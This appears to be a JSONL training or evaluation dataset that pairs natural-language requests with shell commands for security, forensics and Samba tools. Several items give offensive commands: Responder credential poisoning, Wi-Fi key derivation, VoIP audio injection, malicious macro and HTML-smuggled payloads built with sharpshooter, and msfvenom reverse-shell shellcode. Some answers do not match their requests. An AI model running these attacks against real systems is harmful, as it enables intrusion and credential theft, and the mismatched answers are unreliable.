{"input": "Scan for all access points, including those without WPS, on the wireless interface wlan0mon and save the results to a file named output.pcap", "answer": "airodump-ng wlan0mon -w output"}
{"input": "Scan for all access points, including those without WPS, on the wireless interface wlan0mon and limit the scan to the 5GHz frequency band", "answer": "airodump-ng --band a wlan0mon"}
{"input": "Scan for all access points, including those without WPS, on the wireless interface wlan0mon and ignore frame checksum errors", "answer": "wash -i wlan0mon -a -F"}
{"input": "Set the \"SOURCE\" option for the \"recon/domains-hosts/hackertarget\" module to \"example.com\" and run the module", "answer": "recon-cli -m recon/domains-hosts/hackertarget -o SOURCE=example.com -x"}
{"input": "Can you use reconspider to scan the domain \"testdomain.org\" and include all possible details?", "answer": "reconspider -d testdomain.org --all"}
{"input": "Execute a full reconnaissance on the domain \"securewebsite.com\" using every module in reconspider", "answer": "reconspider -d securewebsite.com --all"}
{"input": "Use reconspider to perform an all-encompassing scan on the IP 203.0.113.195", "answer": "reconspider -i 203.0.113.195 --all"}
{"input": "Record a 1024x768 area of the desktop starting at coordinates (200, 300), disable sound, and save the output to \"area_recording.ogv\"", "answer": "recordmydesktop -x 200 -y 300 --width=1024 --height=768 --no-sound -o area_recording.ogv"}
{"input": "Record the desktop with a custom pause shortcut (Ctrl+Alt+p) and save the output to \"custom_pause_recording.ogv\"", "answer": "recordmydesktop --pause-shortcut=Control+Mod1+p -o custom_pause_recording.ogv"}
{"input": "Record the desktop with a custom work directory for temporary files and save the output to \"custom_workdir_recording.ogv\"", "answer": "recordmydesktop --workdir=/tmp/custom_dir -o custom_workdir_recording.ogv"}
{"input": "Recover all JPEG files from the device `/dev/sdb1` and save them to the directory `/recovered_images` with verbose output", "answer": "recoverjpeg -v -o /recovered_images /dev/sdb1"}
{"input": "Recover JPEG files from the disk image `data.img` with quiet mode enabled and save them to the `/recovered_files` directory", "answer": "recoverjpeg -q -o /recovered_files data.img"}
{"input": "Detect duplicate files in the current directory and show the results without making changes", "answer": "fdupes -r ."}
{"input": "List all duplicate files in the current directory without deleting them", "answer": "fdupes -r ."}
{"input": "Check for duplicate files in the current directory and display the results", "answer": "fdupes -r ."}
{"input": "Completely stop all Redeye processes to ensure no background activity remains", "answer": "pkill -f redeye"}
{"input": "Output all registry entries from the file `/mnt/win/c/WINNT/system32/config/system` with verbose details, including security descriptor information", "answer": "reglookup -v -s /mnt/win/c/WINNT/system32/config/system"}
{"input": "Output all registry entries from the file `/mnt/win/c/WINNT/system32/config/system` with security descriptor information and verbose details", "answer": "reglookup -v -s /mnt/win/c/WINNT/system32/config/system"}
{"input": "Analyze the `NTUSER.DAT` hive located at `/cases/user1/NTUSER.DAT` using the `userassist` plugin", "answer": "rip -r /cases/user1/NTUSER.DAT -p userassist"}
{"input": "Run Responder on all interfaces, enabling DHCP responses and setting a random TTL for poisoned answers", "answer": "responder -I ALL -d -t random"}
{"input": "Start Responder on all interfaces, enabling the WPAD rogue proxy server and forcing basic HTTP authentication instead of NTLM", "answer": "responder -I ALL -w -b"}
{"input": "Start the Responder BrowserListener on the `wlan0` interface, enable verbose output, and capture browser requests", "answer": "responder -I wlan0 -b -v"}
{"input": "Start the Responder BrowserListener on the `eth1` interface, enable the BrowserListener module, and disable HTTP and SMB servers", "answer": "responder -I eth1 -b --disable-http --disable-smb"}
{"input": "Scan the entire subnet 192.168.1.0/24 using responder-RunFinger to identify all active hosts", "answer": "nmap -sn 192.168.1.0/24"}
{"input": "Enter research mode in rfcat with safemode enabled for troubleshooting purposes", "answer": "rfcat -r -S"}
{"input": "Start the rfcat_msfrelay tool without requiring authentication and listen only on localhost", "answer": "rfcat_msfrelay --noauth --localonly"}
{"input": "Start rfcat_msfrelay on port 8080 without requiring authentication", "answer": "rfcat_msfrelay -P 8080 --noauth"}
{"input": "Start rfcat_msfrelay on port 9000 with the username \"testuser\" and password \"testpass\", and restrict access to localhost", "answer": "rfcat_msfrelay -P 9000 -u testuser -p testpass --localonly"}
{"input": "Run rfcat_msfrelay with no authentication and an index of 10", "answer": "rfcat_msfrelay -i 10 --noauth"}
{"input": "Start rfcat_msfrelay on port 5000 with the username \"root\" and password \"toor\", and listen only on localhost", "answer": "rfcat_msfrelay -P 5000 -u root -p toor --localonly"}
{"input": "Run rfcat_msfrelay with an index of 3, no authentication, and listen only on localhost", "answer": "rfcat_msfrelay -i 3 --noauth --localonly"}
{"input": "Run rfcat_msfrelay with an index of 7, the username \"operator\", and the password \"op123\", and listen only on localhost", "answer": "rfcat_msfrelay -i 7 -u operator -p op123 --localonly"}
{"input": "Save the detected RFID tag information to an XML file named `tags.xml`", "answer": "rfdump -o tags.xml -f xml"}
{"input": "Analyze the INFO2 file located at `/mnt/evidence/info2` and output the results in XML format to `/mnt/evidence/output.xml`", "answer": "rifiuti2 -x -o /mnt/evidence/output.xml /mnt/evidence/info2"}
{"input": "Parse the INFO2 file at `/home/user/Desktop/info2` and display the deletion times in the local system's time zone", "answer": "rifiuti2 -z /home/user/Desktop/info2"}
{"input": "Analyze the INFO2 file at `/mnt/forensics/info2` and output the results in XML format to `/mnt/forensics/output.xml`, while displaying deletion times in the local system's time zone", "answer": "rifiuti2 -x -z -o /mnt/forensics/output.xml /mnt/forensics/info2"}
{"input": "Analyze the INFO2 file at `/mnt/evidence/info2` and output the results in XML format to `/mnt/evidence/output.xml`, while including legacy (8.3) filenames using codepage 850", "answer": "rifiuti2 -x -l 850 -o /mnt/evidence/output.xml /mnt/evidence/info2"}
{"input": "Analyze the INFO2 file at `/home/user/info2` and output the results in XML format to `/home/user/output.xml`, while including legacy (8.3) filenames using codepage 1252 and displaying deletion times in the local system's time zone", "answer": "rifiuti2 -x -l 1252 -z -o /home/user/output.xml /home/user/info2"}
{"input": "Update the file properties database for all files in the `/usr/bin` directory using rkhunter", "answer": "rkhunter --propupd"}
{"input": "Deduplicate lines in the file `logfile.log` and display the results directly in the terminal", "answer": "sort -u logfile.log"}
{"input": "Use rehex to open the file \"logfile.log\" with all available options enabled for detailed examination", "answer": "rehex logfile.log"}
{"input": "Check the robots.txt file for the website \"example.edu\" using a bot named \"AcademicBot\"", "answer": "curl -A \"AcademicBot\" http://example.edu/robots.txt"}
{"input": "Search for gadgets in the binary 'example.exe' on an x86 architecture and include all gadgets, even duplicates.\"", "answer": "ropper -f example.exe -a x86 --all"}
{"input": "Display all gadgets in the binary 'example.elf' and provide detailed information about each gadget.\"", "answer": "ropper -f example.elf --all --detailed"}
{"input": "Analyze the binary 'example.elf' and display all gadgets, but disable colored output for better readability in logs.\"", "answer": "ropper -f example.elf --all --nocolor"}
{"input": "Calculate router keys for a device with the MAC address \"00:1A:2B:3C:4D:5E\" using routerkeygen-cli", "answer": "routerkeygen-cli -m 00:1A:2B:3C:4D:5E"}
{"input": "Calculate router keys for a network with the SSID \"GuestNetwork\" and only display the calculated keys without additional output using routerkeygen-cli", "answer": "routerkeygen-cli -s GuestNetwork -q"}
{"input": "Generate router keys for a network with the SSID \"PublicWiFi\" and a device with the MAC address \"AA:BB:CC:DD:EE:FF\" using routerkeygen-cli", "answer": "routerkeygen-cli -s PublicWiFi -m AA:BB:CC:DD:EE:FF"}
{"input": "Generate router keys for a device with the MAC address \"11:22:33:44:55:66\" and print only the calculated keys without additional output using routerkeygen-cli", "answer": "routerkeygen-cli -m 11:22:33:44:55:66 -q"}
{"input": "Generate router keys for a network with the SSID \"PrivateNetwork\" and print only the calculated keys without additional output using routerkeygen-cli", "answer": "routerkeygen-cli -s PrivateNetwork -q"}
{"input": "Identify RSA private keys in the memory image `server_dump.img` without specifying a modulus file", "answer": "rsakeyfind server_dump.img"}
{"input": "Generate a mangled wordlist from the file `wordlist.txt` using all available options in rsmangler", "answer": "rsmangler --file wordlist.txt --perms --double --reverse --leet --full-leet --capital --upper --lower --swap --ed --ing --punctuation --years --acronym --common --pna --pnb --na --nb --space --allow-duplicates"}
{"input": "Create a mangled wordlist from `input.txt` and save the output to `mangled_output.txt`, ensuring all options are enabled", "answer": "rsmangler --file input.txt --output mangled_output.txt --perms --double --reverse --leet --full-leet --capital --upper --lower --swap --ed --ing --punctuation --years --acronym --common --pna --pnb --na --nb --space --allow-duplicates"}
{"input": "Generate a mangled wordlist from `base_words.txt`, using all options, and save the output to `final_list.txt`", "answer": "rsmangler --file base_words.txt --output final_list.txt --perms --double --reverse --leet --full-leet --capital --upper --lower --swap --ed --ing --punctuation --years --acronym --common --pna --pnb --na --nb --space --allow-duplicates"}
{"input": "Analyze RTP traffic from the network interface `eth0` and save the output to the directory `/var/log/rtpbreak`, while enabling verbose logging and expecting unprivileged UDP ports", "answer": "rtpbreak -i eth0 -d /var/log/rtpbreak -v -u"}
{"input": "Analyze RTP packets from a pcap file `rtp_traffic.pcap`, expect RTP payload type 96, and fill gaps in raw RTP dumps caused by lost packets", "answer": "rtpbreak -r rtp_traffic.pcap -y 96 -g"}
{"input": "Capture RTP traffic from the network interface `eth1`, disable stdout logging, and run the process in the background", "answer": "rtpbreak -i eth1 > /dev/null 2>&1 &"}
{"input": "Read RTP packets from a pcap file `voip_calls.pcap`, expect RTP payload length of 160 bytes, and set the pattern timeout to 0.5 seconds", "answer": "rtpbreak -r voip_calls.pcap -l 160 -T 0.5"}
{"input": "Inject a WAV file named `sound.wav` into a live audio stream, targeting the source IP `192.168.1.100` and source port `5000`, with the destination IP `192.168.1.200` and destination port `6000`. Use the network interface `eth0` and set the spoof factor to `5`", "answer": "rtpinsertsound -a 192.168.1.100 -A 5000 -b 192.168.1.200 -B 6000 -f 5 -i eth0 sound.wav"}
{"input": "Inject a WAV file named `beep.wav` into a live audio stream, targeting the source IP `192.168.10.1` and source port `2000`, with the destination IP `192.168.10.2` and destination port `3000`. Set the spoof factor to `10` and the jitter factor to `30`", "answer": "rtpinsertsound -a 192.168.10.1 -A 2000 -b 192.168.10.2 -B 3000 -f 10 -j 30 beep.wav"}
{"input": "Inject a WAV file named `warning.wav` into a live audio stream, targeting the source IP `192.168.2.1` and source port `1234`, with the destination IP `192.168.2.2` and destination port `2345`. Set the spoof factor to `3`, the jitter factor to `40`, and pause for `5` seconds before injection", "answer": "rtpinsertsound -a 192.168.2.1 -A 1234 -b 192.168.2.2 -B 2345 -f 3 -j 40 -p 5 warning.wav"}
{"input": "Scan multiple S3 buckets listed in a file named \"buckets.txt\" and print the logs in JSON format", "answer": "s3scanner -bucket-file buckets.txt -json"}
{"input": "Scan multiple S3 buckets listed in a file named \"buckets-to-scan.txt\" and print the logs in JSON format", "answer": "s3scanner -bucket-file buckets-to-scan.txt -json"}
{"input": "Recover data from a damaged floppy disk at /dev/fd0 and save it to a file named floppy_rescue.img, using low-level device calls for error recovery", "answer": "safecopy -L 2 /dev/fd0 floppy_rescue.img"}
{"input": "Rescue data from a corrupted partition at /dev/sdc1 and save it to a file named partition_rescue.img, while marking unrecovered data with the string \"BAD_DATA\"", "answer": "safecopy -M \"BAD_DATA\" /dev/sdc1 partition_rescue.img"}
{"input": "Recover data from a damaged tape drive at /dev/st0 and save it to a file named tape_rescue.img, using an external seek script named seek_script.sh", "answer": "safecopy -S seek_script.sh /dev/st0 tape_rescue.img"}
{"input": "Enable machine-parsable output with the default separator \"|\" for the CTDB utility", "answer": "ctdb -P"}
{"input": "Set the debug level to \"medium\" and specify node 3 for the CTDB operation", "answer": "ctdb -d medium -n 3"}
{"input": "Start the CTDB cluster daemon with default settings", "answer": "ctdbd"}
{"input": "Run the command `ls -l` on all nodes in the CTDB cluster to list files in the current directory", "answer": "onnode all ls -l"}
{"input": "Edit all entries in the LDB database located at `ldb:///var/lib/samba/private/sam.ldb` and search across naming context (NC) boundaries", "answer": "ldbedit -H ldb:///var/lib/samba/private/sam.ldb -a --cross-ncs"}
{"input": "Search for all records in the LDB database located at the URL `ldap://example.com` with the base DN `dc=example,dc=com`", "answer": "ldbsearch -H ldap://example.com -b dc=example,dc=com"}
{"input": "Apply all group policies for the user target with a specific debug level", "answer": "samba-gpupdate --target=User -d 3"}
{"input": "Apply all group policies for the user target without prompting for a password", "answer": "samba-gpupdate --target=User -N"}
{"input": "Apply all group policies for the computer target using a specific authentication file", "answer": "samba-gpupdate --target=Computer -A /path/to/authfile"}
{"input": "Open a local Windows registry hive file located at `/path/to/hive` using regshell", "answer": "regshell -F /path/to/hive"}
{"input": "Start the NetBIOS name server (nmbd) interactively, enable talloc leak reporting, and set the debug level to 5", "answer": "nmbd -i --leak-report -d 5"}
{"input": "Run the NetBIOS name server (nmbd) in the foreground, do not create a new process group, and log debug output to standard output", "answer": "nmbd -F --no-process-group --debug-stdout"}
{"input": "Delete the Samba user \"alice\" from the SAM database", "answer": "pdbedit -x -u alice"}
{"input": "List all Samba users in the smbpasswd style format", "answer": "pdbedit -L -w"}
{"input": "Start the SMB daemon in the foreground and log debug output to standard output", "answer": "smbd -F --debug-stdout"}
{"input": "Start the SMB daemon as a background process and enable basic talloc leak reporting on exit", "answer": "smbd -D --leak-report"}
{"input": "Display all current Samba connections, including processes, shares, locks, and verbose details", "answer": "smbstatus -p -S -L -v"}
{"input": "Display all Samba processes and locks, resolving UIDs to usernames, and skip process existence checks", "answer": "smbstatus -p -L"}
{"input": "Update DNS records for all names and interfaces without attempting to get credentials and without expanding variables in the update list file", "answer": "samba_dnsupdate --all-names --all-interfaces --no-credentials --no-substitutions"}
{"input": "List all valid DSAs that could be used with the `--forced-local-dsa` option and enable debug output", "answer": "samba_kcc --list-valid-dsas --forced-local-dsa --debug"}
{"input": "Upgrade the DNS configuration for Samba using the BIND9_DLZ backend, migrate existing zone data, and enable verbose output", "answer": "samba_upgradedns --dns-backend=BIND9_DLZ --migrate=yes --verbose"}
{"input": "Upgrade the DNS configuration for Samba using the default SAMBA_INTERNAL backend, skip migrating existing zone data, and set the debug level to 3", "answer": "samba_upgradedns --dns-backend=SAMBA_INTERNAL --migrate=no -d 3"}
{"input": "Upgrade the DNS configuration for Samba using the BIND9_DLZ backend, migrate existing zone data, and specify a custom configuration file located at /etc/samba/smb.conf", "answer": "samba_upgradedns --dns-backend=BIND9_DLZ --migrate=yes -s /etc/samba/smb.conf"}
{"input": "Upgrade the DNS configuration for Samba using the SAMBA_INTERNAL backend, migrate existing zone data, and set the realm to EXAMPLE.COM", "answer": "samba_upgradedns --dns-backend=SAMBA_INTERNAL --migrate=yes --realm=EXAMPLE.COM"}
{"input": "Upgrade the DNS configuration for Samba using the BIND9_DLZ backend, skip migrating existing zone data, and use Kerberos authentication with the credentials cache located at /tmp/krb5cc_1000", "answer": "samba_upgradedns --dns-backend=BIND9_DLZ --migrate=no --use-krb5-ccache=/tmp/krb5cc_1000"}
{"input": "Upgrade the DNS configuration for Samba using the SAMBA_INTERNAL backend, migrate existing zone data, and specify the IP address of the server as 192.168.1.100", "answer": "samba_upgradedns --dns-backend=SAMBA_INTERNAL --migrate=yes --ipaddress=192.168.1.100"}
{"input": "Upgrade the DNS configuration for Samba using the BIND9_DLZ backend, skip migrating existing zone data, and use a simple bind with the DN \"cn=admin,dc=example,dc=com\" and password \"adminpass\"", "answer": "samba_upgradedns --dns-backend=BIND9_DLZ --migrate=no --simple-bind-dn=\"cn=admin,dc=example,dc=com\" --password=adminpass"}
{"input": "Upgrade the DNS configuration for Samba using the SAMBA_INTERNAL backend, migrate existing zone data, and use the machine account password stored in the system", "answer": "samba_upgradedns --dns-backend=SAMBA_INTERNAL --migrate=yes -P"}
{"input": "Upgrade the DNS configuration for Samba using the BIND9_DLZ backend, skip migrating existing zone data, and set the workgroup to WORKGROUP", "answer": "samba_upgradedns --dns-backend=BIND9_DLZ --migrate=no -W WORKGROUP"}
{"input": "How can I set the debug level to 3 and send debug output to standard output while using dbwrap_tool?", "answer": "dbwrap_tool --debuglevel=3 --debug-stdout"}
{"input": "I need to use an alternative configuration file named `custom_smb.conf` with dbwrap_tool. What command should I run?", "answer": "dbwrap_tool --configfile=custom_smb.conf"}
{"input": "I want to enable full talloc leak reporting on exit and set the log file basename to `dbwrap_log` using dbwrap_tool. What command should I use?", "answer": "dbwrap_tool --leak-report-full --log-basename=dbwrap_log"}
{"input": "Retrieve the current status of the Samba server using the 'net' tool", "answer": "systemctl status smbd"}
{"input": "List all open files on the Samba server using the 'net' tool", "answer": "net file"}
{"input": "Search for a master browser on the network using the broadcast address 192.168.1.255", "answer": "nmblookup -M -B 192.168.1.255"}
{"input": "Launch the Samba registry editor with talloc leak reporting enabled and send debug output to standard output", "answer": "samba-regedit --leak-report --debug-stdout"}
{"input": "Launch the Samba registry editor with a custom log file basename \"samba_log\" and set the debug level to 2", "answer": "samba-regedit -l samba_log -d 2"}
{"input": "Force the `nmbd` process to reload its configuration file", "answer": "smbcontrol nmbd reload-config"}
{"input": "Ask the `winbindd` process to go into an offline state", "answer": "smbcontrol winbindd offline"}
{"input": "Send a ping message to the `winbindd` process to check if it is responsive", "answer": "smbcontrol winbindd ping"}
{"input": "Display the talloc memory usage of the `smbd` process", "answer": "smbcontrol smbd pool-usage"}
{"input": "Dump the list of domains known to the `winbindd` process", "answer": "smbcontrol winbindd dump-domain-list"}
{"input": "Send a print notify message to the `smbd` process", "answer": "smbcontrol smbd printnotify"}
{"input": "Add a new user named \"john\" to the Samba password file using the local mode", "answer": "smbpasswd -L -a john"}
{"input": "Enable the Samba user account for \"alice\" using the local mode", "answer": "smbpasswd -L -e alice"}
{"input": "Set no password for the Samba user account \"guest\" using the local mode", "answer": "smbpasswd -L -n guest"}
{"input": "Change the SMB password for the user \"lisa\" using the standard input (stdin) for the password prompt", "answer": "smbpasswd -s lisa"}
{"input": "Check the internal correctness of the smb.conf file at /etc/samba/smb.conf and show default options as well", "answer": "testparm -v /etc/samba/smb.conf"}
{"input": "Set the debug level to 3 and check the smb.conf file at /etc/samba/smb.conf for internal correctness", "answer": "testparm -d 3 /etc/samba/smb.conf"}
{"input": "Test wildcard matching on `//192.168.3.50/backup` with a seed value of 67890, 200 operations, and enable full talloc leak reporting on exit", "answer": "masktest //192.168.3.50/backup --seed=67890 --num-ops=200 --leak-report-full"}
{"input": "Parse a DCE/RPC packet from the file `sample.bin` and use an alternative configuration file `custom.conf`", "answer": "ndrdump -c custom.conf sample.bin"}
{"input": "Run all tests in the \"RPC\" suite against the SMB server at 192.168.1.100 with a seed of 12345 for the randomizer", "answer": "smbtorture //192.168.1.100 RPC --seed=12345"}
{"input": "Run all tests in the \"NTTRANS\" suite against the SMB server at 192.168.1.100 with a load file named \"loadfile.txt\"", "answer": "smbtorture //192.168.1.100 NTTRANS --loadfile=loadfile.txt"}
{"input": "Run all tests in the \"LOCK\" suite against the SMB server at 192.168.1.100 with a maximum of 10 simultaneous async requests", "answer": "smbtorture //192.168.1.100 LOCK --num-async=10"}
{"input": "Copy a file from a remote SMB share to a local machine, using Kerberos authentication and setting the maximum protocol level to SMB3", "answer": "smbclient //server/share -k -m SMB3 -c 'get remote/file /path/to/local/file'"}
{"input": "Connect to the SMB server at IP 192.168.0.50 using Kerberos authentication and the credentials cache located at `/tmp/krb5cc_1000`, and execute the command \"netshareenumall\" to list all shared resources", "answer": "rpcclient --use-krb5-ccache=/tmp/krb5cc_1000 -c \"netshareenumall\" 192.168.0.50"}
{"input": "Connect to the SMB server at IP 10.0.0.10 using the username \"testuser\" and password \"testpass\", and execute multiple commands: \"enumdomgroups\" to list domain groups and \"enumprinters\" to list printers", "answer": "rpcclient -U testuser%testpass -c \"enumdomgroups; enumprinters\" 10.0.0.10"}
{"input": "Download all files from the SMB share at `smb://10.10.10.5/data` using Kerberos authentication and encrypt the SMB transport", "answer": "smbget --use-kerberos=required -e --recursive smb://10.10.10.5/data"}
{"input": "Download all files from the SMB share at `smb://10.0.0.10/files` and write the output to a file named `output.zip`", "answer": "smbget -R smb://10.0.0.10/files && zip -r output.zip files"}
{"input": "List all domains and servers in the SMB network tree", "answer": "smbtree"}
{"input": "Display only the domains in the SMB network tree", "answer": "smbtree -D"}
{"input": "List all domains and servers in the SMB network tree without prompting for a password", "answer": "smbtree -S -N"}
{"input": "Retrieve the value for the key `password` from the TDB file `auth.tdb` to troubleshoot an authentication issue", "answer": "tdbdump auth.tdb | grep 'password'"}
{"input": "Extract the value for the key `session_id` from the TDB file `sessions.tdb` to debug a session management issue", "answer": "tdbdump sessions.tdb | grep 'session_id'"}
{"input": "Retrieve the value for the key `api_key` from the TDB file `secrets.tdb` to verify its configuration", "answer": "tdbdump secrets.tdb | grep 'api_key'"}
{"input": "Use tdbrestore to generate a TDB file named \"output.tdb\" from a dump", "answer": "tdbrestore <dump_file> output.tdb"}
{"input": "Open the TDB file named \"example.tdb\" using tdbtool without locking", "answer": "tdbtool example.tdb"}
{"input": "Authenticate a user with the username \"john.doe\" in the domain \"example.com\" using NTLM authentication, and retrieve the NT session key", "answer": "ntlm_auth --username=john.doe --domain=example.com --request-nt-key"}
{"input": "Authenticate a user with the username \"admin\" in the domain \"ad.example.com\" and require that the user is a member of the group \"Domain Admins\" for the authentication to succeed", "answer": "ntlm_auth --username=admin --domain=ad.example.com --require-membership-of=\"Domain Admins\""}
{"input": "Authenticate a user with the username \"alice\" in the domain \"alice.local\" and use an alternative configuration file located at \"/etc/samba/alt_smb.conf\"", "answer": "ntlm_auth --username=alice --domain=alice.local --configfile=/etc/samba/alt_smb.conf"}
{"input": "Authenticate a user with the username \"charlie\" in the domain \"charlie.local\" and send debug output to standard output", "answer": "ntlm_auth --username=charlie --domain=charlie.local --debug-stdout"}
{"input": "Convert the username \"jdoe\" to its corresponding SID", "answer": "wbinfo -n jdoe"}
{"input": "Convert the SID \"S-1-5-21-123456789-1234567890-123456789-500\" to its corresponding username", "answer": "wbinfo -s S-1-5-21-123456789-1234567890-123456789-500"}
{"input": "Check if the shared secret between the Samba server and the domain controller is valid", "answer": "wbinfo -t"}
{"input": "Ping the domain controller to check the NETLOGON connection", "answer": "ping <domain_controller_ip_or_hostname>"}
{"input": "Get the UID for the user with SID \"S-1-5-21-123456789-1234567890-123456789-500\"", "answer": "wbinfo -S S-1-5-21-123456789-1234567890-123456789-500"}
{"input": "Check if the winbind daemon is alive and responding", "answer": "wbinfo -p"}
{"input": "Start the winbindd daemon in the foreground and log debug output to standard output", "answer": "winbindd -F --debug-stdout"}
{"input": "Run winbindd interactively, disable caching, and set the debug level to 3", "answer": "winbindd -i -n -d 3"}
{"input": "Run winbindd in the foreground, set the debug level to 5, and disable the creation of a new process group", "answer": "winbindd -F -d 5 --no-process-group"}
{"input": "Run winbindd interactively, disable caching, and send debug output to standard output", "answer": "winbindd -i -n --debug-stdout"}
{"input": "Start winbindd as a daemon, use the default configuration file, and set the debug level to 2", "answer": "winbindd -D -d 2"}
{"input": "Recover files from the disk image `disk.img` in verbose mode to see detailed output during the carving process", "answer": "scalpel -v -o /output -c /etc/scalpel/scalpel.conf disk.img"}
{"input": "Start a new screen session named \"backup\" in detached mode", "answer": "screen -dmS backup"}
{"input": "Start a new screen session with optimal output rather than exact vt100 emulation", "answer": "screen -O"}
{"input": "List all available directories in the seclists collection", "answer": "ls /usr/share/seclists"}
{"input": "Count the number of lines in the \"Top1000-Root-User-Agents.txt\" file in the \"Usernames\" directory", "answer": "wc -l /usr/share/seclists/Usernames/Top1000-Root-User-Agents.txt"}
{"input": "Search for the word \"admin\" in all files within the \"Usernames\" directory", "answer": "grep -r \"admin\" /usr/share/seclists/Usernames/"}
{"input": "Search for the word \"shell\" in all files within the \"Web-Shells\" directory", "answer": "grep -r \"shell\" /usr/share/seclists/Web-Shells/"}
{"input": "Search for all files in the \"Miscellaneous\" directory that contain the word \"exploit\" in their filenames", "answer": "find /usr/share/seclists/Miscellaneous -type f -name '*exploit*'"}
{"input": "Send an email from [email protected] to [email protected] with the subject \"Project Deadline\" and the message body \"The project deadline is approaching. Please ensure all tasks are completed by Friday.\" Attach the file \"project_report.pdf.\"", "answer": "sendemail -f [email protected] -t [email protected] -u \"Project Deadline\" -m \"The project deadline is approaching. Please ensure all tasks are completed by Friday.\" -a project_report.pdf"}
{"input": "Send an email from [email protected] to [email protected], with the subject \"Weekly Report\" and the message body \"Attached is the weekly report.\" Use the SMTP server smtp.example.com on port 587, and authenticate with the username \"user\" and password \"pass.\"", "answer": "sendemail -f [email protected] -t [email protected] -u \"Weekly Report\" -m \"Attached is the weekly report.\" -s smtp.example.com:587 -xu user -xp pass"}
{"input": "Send an email from [email protected] to [email protected], with the subject \"Event Invitation\" and the message body \"You are invited to our annual event.\" Set the message content type to HTML", "answer": "sendemail -f [email protected] -t [email protected] -u \"Event Invitation\" -m \"You are invited to our annual event.\" -o message-content-type=html"}
{"input": "Send an email from [email protected] to [email protected], with the subject \"Holiday Schedule\" and the message body \"Please find the holiday schedule attached.\" Set the message charset to UTF-8", "answer": "sendemail -f [email protected] -t [email protected] -u \"Holiday Schedule\" -m \"Please find the holiday schedule attached.\" -o message-charset=UTF-8"}
{"input": "Start SentryPeer in RESTful API mode and enable verbose logging for detailed output", "answer": "sentrypeer -a -v"}
{"input": "Configure SentryPeer to use a custom database location at `/var/lib/sentrypeer/custom.db` and enable JSON logging", "answer": "sentrypeer -f /var/lib/sentrypeer/custom.db -j"}
{"input": "Start SentryPeer with RESTful API mode enabled and specify a WebHook URL at `https://webhook.example.com/events`", "answer": "sentrypeer -a -w https://webhook.example.com/events"}
{"input": "Start the Social-Engineer Toolkit with all options and enable verbose logging for debugging purposes", "answer": "setoolkit"}
{"input": "Initialize the Social-Engineer Toolkit with all options and set the default payload to a custom executable", "answer": "setoolkit"}
{"input": "Run the Social-Engineer Toolkit with all options and set the output directory for logs and reports to `/var/log/setoolkit`", "answer": "setoolkit"}
{"input": "Generate a stageless payload using .NET version 4, with a macro payload, and output the result to a file named \"malicious_doc.doc\"", "answer": "sharpshooter --stageless --dotnetver 4 --payload macro --output malicious_doc.doc"}
{"input": "Generate a payload using the XSL remote COM staging technique, with a VBScript payload, and smuggle the file inside an HTML template named \"mcafee.html\"", "answer": "sharpshooter --com xslremote --payload vbs --smuggle --template mcafee.html"}
{"input": "Generate a payload using the Outlook COM staging technique, with a JSE payload, and specify the namespace \"Evil.Payload\" and entry point \"Run\" for custom CSharp compilation", "answer": "sharpshooter --com outlook --payload jse --namespace Evil.Payload --entrypoint Run"}
{"input": "Create a payload using the ShellBrowserWin COM staging technique, with a SLK payload, and include references to \"mscorlib.dll\" and \"System.Windows.Forms.dll\" for custom CSharp compilation", "answer": "sharpshooter --com shellbrowserwin --payload slk --refs mscorlib.dll,System.Windows.Forms.dll"}
{"input": "Open the file \"data.img\" in shed and position the cursor at offset 0x100 to start editing from that location", "answer": "shed -s 0x100 data.img"}
{"input": "Open the file \"log.txt\" in shed with hex offsets displayed by default", "answer": "shed -H log.txt"}
{"input": "Open the device file \"/dev/sda\" in shed and set the length to 512 bytes for editing", "answer": "shed -L 512 /dev/sda"}
{"input": "Open the file \"backup.img\" in shed, set the cursor to offset 0x200, and display hex offsets by default", "answer": "shed -s 0x200 -H backup.img"}
{"input": "Load a specific configuration file named `exploit_config.cfg` when starting shellfire", "answer": "shellfire -c exploit_config.cfg"}
{"input": "Convert a shellcode file named `shellcode.bin` to assembly language using shellnoob", "answer": "shellnoob.py --from-bin shellcode.bin --to-asm"}
{"input": "Convert a hex file named `payload.hex` to Python-compatible shellcode using shellnoob", "answer": "shellnoob.py --from-hex payload.hex --to-python"}
{"input": "Convert a shellcode file named `shellcode.asm` to a binary file in Intel syntax using shellnoob", "answer": "shellnoob.py --from-asm shellcode.asm --to-bin --intel"}
{"input": "Retrieve the error message for error number `13` using shellnoob", "answer": "shellnoob.py --get-strerror 13"}
{"input": "Convert a shellcode file named `shellcode.asm` to a C-compatible format using shellnoob", "answer": "shellnoob.py --from-asm shellcode.asm --to-c"}
{"input": "Look up the username \"bob_builder\" on all social networks and make the requests over Tor for anonymity", "answer": "sherlock --tor bob_builder"}
{"input": "Look up the username \"fiona_gallagher\" on all social networks and open the results in the default web browser", "answer": "sherlock --browse fiona_gallagher"}
{"input": "Generate shellcode using the \"windows/shell_reverse_tcp\" payload for x86 architecture, avoiding bad characters like \"\\x00\\x0a\\x0d\"", "answer": "msfvenom -p windows/shell_reverse_tcp -a x86 -b '\\x00\\x0a\\x0d' -f c"}
{"input": "Print detailed information about the \"linux/x86/exec\" payload", "answer": "msfvenom -p linux/x86/exec --list-options"}
{"input": "Use the \"windows/x64/meterpreter/reverse_https\" payload to generate shellcode, avoiding bad characters \"\\x00\\xff\", and output it in raw format", "answer": "msfvenom -p windows/x64/meterpreter/reverse_https -b '\\x00\\xff' -f raw"}
{"input": "List all available formats supported by sickle-tool", "answer": "sickle-tool --help"}
{"input": "Guess Oracle SIDs for the IP address 10.10.10.5 using the dictionary file `oracle_sids.txt` and specify port 1522 instead of the default port", "answer": "sidguess -i 10.10.10.5 -d oracle_sids.txt -p 1522"}
{"input": "Guess Oracle SIDs for the IP address 172.16.254.1 using the dictionary file `sid_list.txt` and set the mode to `findfirst` to stop after the first successful guess", "answer": "sidguess -i 172.16.254.1 -d sid_list.txt -m findfirst"}
{"input": "Guess Oracle SIDs for the IP address 192.168.0.50 using the dictionary file `common_sids.txt`, save the results to a report file named `output.txt`, and use port 1530", "answer": "sidguess -i 192.168.0.50 -d common_sids.txt -r output.txt -p 1530"}
{"input": "Guess Oracle SIDs for the IP address 10.0.0.10 using the dictionary file `oracle.txt` and set the mode to `findall` to attempt all guesses in the dictionary", "answer": "sidguess -i 10.0.0.10 -d oracle.txt -m findall"}
{"input": "Guess Oracle SIDs for the IP address 203.0.113.45 using the dictionary file `sids.dict`, save the results to a report file named `results.log`, and use port 1525", "answer": "sidguess -i 203.0.113.45 -d sids.dict -r results.log -p 1525"}
